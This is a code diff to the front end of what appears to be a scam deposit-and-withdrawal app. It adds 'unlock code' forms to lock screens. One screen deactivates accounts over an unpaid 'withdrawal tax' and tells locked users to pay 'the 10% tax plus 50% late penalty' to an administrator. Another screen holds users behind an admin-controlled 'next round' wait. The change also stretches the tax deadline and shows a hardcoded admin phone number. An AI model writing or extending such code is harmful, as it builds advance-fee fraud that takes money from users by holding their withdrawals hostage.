@@ -35,6 +35,8 @@ import {
   Clock,
   LogOut,
   AlertTriangle,
+  KeyRound,
+  Unlock,
   Download,
   Share,
   UploadCloud,
@@ -785,8 +787,62 @@ const getRefValidationResult = (bank: string, ref: string, lang: string) => {
 type UserTab = 'home' | 'orders' | 'my';
 
 function AppContent() {
-  const { currentUser, deposit, withdraw, transactions, addSupportTicket, rechargeAccounts, language, setLanguage, currency, setCurrency, formatPrice, verifyRechargeOffline, logout } = useApp();
+  const { currentUser, deposit, withdraw, transactions, addSupportTicket, rechargeAccounts, language, setLanguage, currency, setCurrency, formatPrice, verifyRechargeOffline, redeemUnlockCode, logout } = useApp();
   const { t } = useTranslation(language);
+
+  const [taxUnlockCodeInput, setTaxUnlockCodeInput] = useState('');
+  const [taxUnlockError, setTaxUnlockError] = useState('');
+  const [taxUnlockSuccess, setTaxUnlockSuccess] = useState('');
+  const [taxUnlockLoading, setTaxUnlockLoading] = useState(false);
+
+  const [nextRoundCodeInput, setNextRoundCodeInput] = useState('');
+  const [nextRoundUnlockError, setNextRoundUnlockError] = useState('');
+  const [nextRoundUnlockSuccess, setNextRoundUnlockSuccess] = useState('');
+  const [nextRoundUnlockLoading, setNextRoundUnlockLoading] = useState(false);
+
+  const handleRedeemTaxUnlockCode = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setTaxUnlockError('');
+    setTaxUnlockSuccess('');
+
+    if (!taxUnlockCodeInput.trim()) {
+      setTaxUnlockError('Please enter a valid unlock code.');
+      return;
+    }
+
+    setTaxUnlockLoading(true);
+    const res = await redeemUnlockCode(taxUnlockCodeInput.trim());
+    setTaxUnlockLoading(false);
+
+    if (res.success) {
+      setTaxUnlockSuccess(res.message);
+      setTaxUnlockCodeInput('');
+    } else {
+      setTaxUnlockError(res.message);
+    }
+  };
+
+  const handleRedeemNextRoundUnlockCode = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setNextRoundUnlockError('');
+    setNextRoundUnlockSuccess('');
+
+    if (!nextRoundCodeInput.trim()) {
+      setNextRoundUnlockError('Please enter a valid unlock code.');
+      return;
+    }
+
+    setNextRoundUnlockLoading(true);
+    const res = await redeemUnlockCode(nextRoundCodeInput.trim());
+    setNextRoundUnlockLoading(false);
+
+    if (res.success) {
+      setNextRoundUnlockSuccess(res.message);
+      setNextRoundCodeInput('');
+    } else {
+      setNextRoundUnlockError(res.message);
+    }
+  };
 
   const isEthiopianUser = currentUser && (
     currentUser.phoneNumber?.trim().startsWith('+251') || 
@@ -1211,13 +1267,13 @@ function AppContent() {
   // Next Round Coming Soon mode lock screen - NEVER lock admin accounts or admin view
   const isAdminAccount = currentUser.role === 'admin' || isSamePhone(currentUser.phoneNumber, '0951560276') || isAdminView;
 
-  // Expired Withdrawal Tax lock screen (unpaid withdrawal tax for more than 30 minutes)
-  const THIRTY_MINUTES_MS = 30 * 60 * 1000;
+  // Expired Withdrawal Tax lock screen (unpaid withdrawal tax for more than 3 days)
+  const THREE_DAYS_MS = 3 * 24 * 60 * 60 * 1000;
   const expiredTaxWithdrawal = !isAdminAccount ? transactions.find(t => 
     t.userId === currentUser.id && 
     t.type === 'withdraw' && 
     t.status === 'pending' && 
-    (Date.now() - new Date(t.createdAt).getTime()) > THIRTY_MINUTES_MS
+    (Date.now() - new Date(t.createdAt).getTime()) > THREE_DAYS_MS
   ) : null;
 
   if (expiredTaxWithdrawal) {
@@ -1257,12 +1313,12 @@ function AppContent() {
               </div>
               <div className="flex justify-between items-center text-slate-300 pt-1 border-t border-rose-500/20">
                 <span>Tax Payment Time Limit:</span>
-                <span className="font-mono text-rose-400 font-bold">30 Minutes Exceeded</span>
+                <span className="font-mono text-rose-400 font-bold">3 Days Exceeded</span>
               </div>
             </div>
 
             <p className="text-xs text-slate-300 leading-relaxed font-medium">
-              Your withdrawal request was created over 30 minutes ago, but the required 10% tax payment was not completed within the mandatory 30-minute window. Application access has been deactivated for your account.
+              Your withdrawal request was created over 3 days ago, but the required 10% tax payment was not completed within the mandatory 3-day window. Application access has been deactivated for your account.
             </p>
           </div>
 
@@ -1270,6 +1326,47 @@ function AppContent() {
             <div className="bg-slate-900/80 rounded-2xl p-3.5 border border-slate-700/60 text-slate-400 text-[11px] font-medium leading-normal">
               💬 Please contact Customer Support or System Administrator to reactivate your account.
             </div>
+          </div>
+
+          {/* Unlock Code Entry Form */}
+          <div className="pt-2 border-t border-slate-700/60 text-left space-y-2">
+            <label className="text-[11px] font-bold text-amber-300 uppercase tracking-wider flex items-center gap-1.5">
+              <KeyRound size={14} className="text-amber-400" /> Enter Unlock Code
+            </label>
+            <form onSubmit={handleRedeemTaxUnlockCode} className="space-y-2">
+              <div className="flex gap-2">
+                <input
+                  type="text"
+                  placeholder="e.g. TL-849201"
+                  value={taxUnlockCodeInput}
+                  onChange={(e) => setTaxUnlockCodeInput(e.target.value.toUpperCase())}
+                  className="flex-1 bg-slate-900/90 border border-slate-600 focus:border-amber-400 rounded-xl px-3 py-2 text-xs font-mono font-bold text-white uppercase placeholder-slate-500 focus:outline-none"
+                />
+                <button
+                  type="submit"
+                  disabled={taxUnlockLoading}
+                  className="bg-amber-500 hover:bg-amber-600 disabled:opacity-50 text-slate-950 font-black text-xs px-4 py-2 rounded-xl transition-all shadow-md cursor-pointer flex items-center gap-1 shrink-0"
+                >
+                  <Unlock size={14} />
+                  <span>{taxUnlockLoading ? 'Unlocking...' : 'Unlock'}</span>
+                </button>
+              </div>
+
+              {taxUnlockError && (
+                <div className="text-[11px] font-bold text-rose-400 bg-rose-950/60 border border-rose-500/30 p-2 rounded-xl">
+                  ⚠️ {taxUnlockError}
+                </div>
+              )}
+
+              {taxUnlockSuccess && (
+                <div className="text-[11px] font-bold text-emerald-400 bg-emerald-950/60 border border-emerald-500/30 p-2 rounded-xl">
+                  ✅ {taxUnlockSuccess}
+                </div>
+              )}
+            </form>
+            <p className="text-[10px] text-slate-400 leading-normal">
+              Pay the 10% tax plus 50% late penalty to the administrator to receive your tax unlock code.
+            </p>
           </div>
 
           {/* Bottom Logout Method */}
@@ -1331,6 +1428,47 @@ function AppContent() {
               <Clock size={14} className="text-amber-400 animate-spin" />
               <span>System awaiting next round dispatch by admin</span>
             </div>
+          </div>
+
+          {/* Next Round Unlock Code Entry Form */}
+          <div className="pt-2 border-t border-slate-700/60 text-left space-y-2">
+            <label className="text-[11px] font-bold text-emerald-300 uppercase tracking-wider flex items-center gap-1.5">
+              <KeyRound size={14} className="text-emerald-400" /> Enter Next Round Unlock Code
+            </label>
+            <form onSubmit={handleRedeemNextRoundUnlockCode} className="space-y-2">
+              <div className="flex gap-2">
+                <input
+                  type="text"
+                  placeholder="e.g. NR-392014"
+                  value={nextRoundCodeInput}
+                  onChange={(e) => setNextRoundCodeInput(e.target.value.toUpperCase())}
+                  className="flex-1 bg-slate-900/90 border border-slate-600 focus:border-emerald-400 rounded-xl px-3 py-2 text-xs font-mono font-bold text-white uppercase placeholder-slate-500 focus:outline-none"
+                />
+                <button
+                  type="submit"
+                  disabled={nextRoundUnlockLoading}
+                  className="bg-emerald-500 hover:bg-emerald-600 disabled:opacity-50 text-slate-950 font-black text-xs px-4 py-2 rounded-xl transition-all shadow-md cursor-pointer flex items-center gap-1 shrink-0"
+                >
+                  <Unlock size={14} />
+                  <span>{nextRoundUnlockLoading ? 'Unlocking...' : 'Unlock'}</span>
+                </button>
+              </div>
+
+              {nextRoundUnlockError && (
+                <div className="text-[11px] font-bold text-rose-400 bg-rose-950/60 border border-rose-500/30 p-2 rounded-xl">
+                  ⚠️ {nextRoundUnlockError}
+                </div>
+              )}
+
+              {nextRoundUnlockSuccess && (
+                <div className="text-[11px] font-bold text-emerald-400 bg-emerald-950/60 border border-emerald-500/30 p-2 rounded-xl">
+                  ✅ {nextRoundUnlockSuccess}
+                </div>
+              )}
+            </form>
+            <p className="text-[10px] text-slate-400 leading-normal">
+              Obtain a Next Round unlock code from the administrator to immediately bypass the waiting screen.
+            </p>
           </div>
 
           {/* Bottom Logout Method */}
